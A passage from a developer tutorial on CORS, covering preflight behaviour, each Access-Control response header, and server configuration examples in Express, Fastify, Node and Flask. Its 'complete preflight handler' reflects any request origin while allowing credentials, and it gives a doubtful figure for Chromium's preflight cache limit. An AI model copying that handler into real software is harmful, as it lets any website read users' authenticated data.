formData.append('name', 'John');

fetch('https://api.example.com/submit', {
  method: 'POST',
  body: formData // Content-Type: multipart/form-data (simple)
});
```

### Error Scenarios

#### Preflight Failure

If the preflight fails, the actual request never executes:

```javascript
fetch('https://api.example.com/data', {
  method: 'DELETE'
})
.catch(error => {
  // Error occurs during preflight, not actual request
  console.error('CORS preflight failed:', error);
});
```

#### Missing CORS Headers

```javascript
// Server responds without Access-Control-Allow-Origin
// Browser blocks the response from reaching JavaScript
fetch('https://api.example.com/data')
.then(response => response.json())
.catch(error => {
  // TypeError: Failed to fetch (CORS error)
});
```

#### Wildcard with Credentials

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

This combination is invalid and the browser will block the request.

### Debugging Complex vs Simple Requests

#### Browser DevTools Network Tab

- **Simple requests**: Single request entry
- **Complex requests**: Two entries (OPTIONS preflight + actual request)

#### Console Warnings

Browsers log CORS errors to the console:

```
Access to fetch at 'https://api.example.com' from origin 'https://yourdomain.com' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
```

#### Checking Request Type

Examine the Network tab:

- Preflight shows `OPTIONS` method with `Access-Control-Request-*` headers
- Status code `204 No Content` typically indicates successful preflight
- Check `Access-Control-Max-Age` to see cache duration

---

## CORS Headers (Server-Side)

### Access-Control-Allow-Origin

The fundamental CORS header that specifies which origins can access the resource.

**Syntax:**

```
Access-Control-Allow-Origin: <origin>
Access-Control-Allow-Origin: *
```

**Specific origin:**

```http
Access-Control-Allow-Origin: https://example.com
```

**Wildcard (any origin):**

```http
Access-Control-Allow-Origin: *
```

**Dynamic origin reflection:**

```javascript
// Node.js/Express example
app.use((req, res, next) => {
  const allowedOrigins = ['https://app1.com', 'https://app2.com'];
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
```

**Critical limitation:** When using credentials (`Access-Control-Allow-Credentials: true`), you cannot use `*`. You must specify an exact origin.

### Access-Control-Allow-Methods

Specifies which HTTP methods are permitted for cross-origin requests.

**Syntax:**

```
Access-Control-Allow-Methods: <method>, <method>, ...
```

**Example:**

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

**Common patterns:**

```javascript
// Read-only API
res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS');

// Full CRUD operations
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
```

This header is sent in response to preflight requests and defines which methods the actual request may use.

### Access-Control-Allow-Headers

Specifies which request headers can be used in the actual request.

**Syntax:**

```
Access-Control-Allow-Headers: <header>, <header>, ...
```

**Example:**

```http
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
```

**Dynamic reflection pattern:**

```javascript
app.use((req, res, next) => {
  const requestHeaders = req.headers['access-control-request-headers'];
  if (requestHeaders) {
    res.setHeader('Access-Control-Allow-Headers', requestHeaders);
  }
  next();
});
```

**Common headers to allow:**

- `Content-Type` - for JSON/XML payloads
- `Authorization` - for bearer tokens
- `X-Custom-Header` - application-specific headers
- `Accept` - content negotiation
- `X-CSRF-Token` - CSRF protection

### Access-Control-Allow-Credentials

Indicates whether the response can be exposed when credentials flag is true.

**Syntax:**

```
Access-Control-Allow-Credentials: true
```

**Note:** The only valid value is `true`. Omit the header entirely if credentials shouldn't be allowed.

**Server implementation:**

```javascript
res.setHeader('Access-Control-Allow-Credentials', 'true');
res.setHeader('Access-Control-Allow-Origin', 'https://specific-origin.com'); // Cannot use *
```

**Client-side requirement:**

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include'  // Required on client side
});
```

Enables cookies, authorization headers, and TLS client certificates to be sent cross-origin.

### Access-Control-Expose-Headers

Specifies which response headers should be accessible to the client-side script.

**Syntax:**

```
Access-Control-Expose-Headers: <header>, <header>, ...
```

**Default exposed headers (safe-listed):**

- `Cache-Control`
- `Content-Language`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

**Example for custom headers:**

```http
Access-Control-Expose-Headers: X-Total-Count, X-Page-Number, ETag
```

**Server implementation:**

```javascript
res.setHeader('X-Total-Count', '150');
res.setHeader('X-Page-Number', '3');
res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count, X-Page-Number');
```

**Client-side access:**

```javascript
fetch('https://api.example.com/items')
  .then(response => {
    const totalCount = response.headers.get('X-Total-Count'); // Now accessible
  });
```

### Access-Control-Max-Age

Specifies how long preflight request results can be cached.

**Syntax:**

```
Access-Control-Max-Age: <delta-seconds>
```

**Example:**

```http
Access-Control-Max-Age: 86400
```

**Common values:**

- `86400` - 24 hours (recommended for production)
- `600` - 10 minutes (development)
- `3600` - 1 hour (moderate caching)

**Implementation:**

```javascript
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.sendStatus(204);
});
```

**Browser limitations:** Different browsers impose their own maximum limits (typically 5-10 minutes for Chromium, 24 hours for Firefox).

### Preflight Request Handling

Browsers send preflight requests using the OPTIONS method before certain cross-origin requests.

**Triggers for preflight:**

- Methods other than GET, HEAD, POST
- POST requests with Content-Type other than:
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`
- Custom headers beyond safe-listed ones
- Readable streams in request body

**Complete preflight handler:**

```javascript
// Express example
app.options('/api/*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(204); // No content
});
```

**Preflight request example:**

```http
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

**Preflight response example:**

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

### Complete Server Implementation Examples

**Express.js:**

```javascript
const express = require('express');
const app = express();

// CORS middleware
app.use((req, res, next) => {
  const allowedOrigins = [
    'https://app.example.com',
    'https://admin.example.com'
  ];
  
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
  res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count, X-Rate-Limit');
  res.setHeader('Access-Control-Max-Age', '86400');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  
  next();
});

// Routes
app.get('/api/data', (req, res) => {
  res.json({ data: 'example' });
});
```

**Fastify:**

```javascript
const fastify = require('fastify')();

fastify.register(require('@fastify/cors'), {
  origin: ['https://app.example.com', 'https://admin.example.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  maxAge: 86400
});
```

**Node.js HTTP module:**

```javascript
const http = require('http');

const server = http.createServer((req, res) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://app.example.com'];
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }
  
  // Handle actual request
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ message: 'Success' }));
});
```

**Python Flask:**

```python
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)

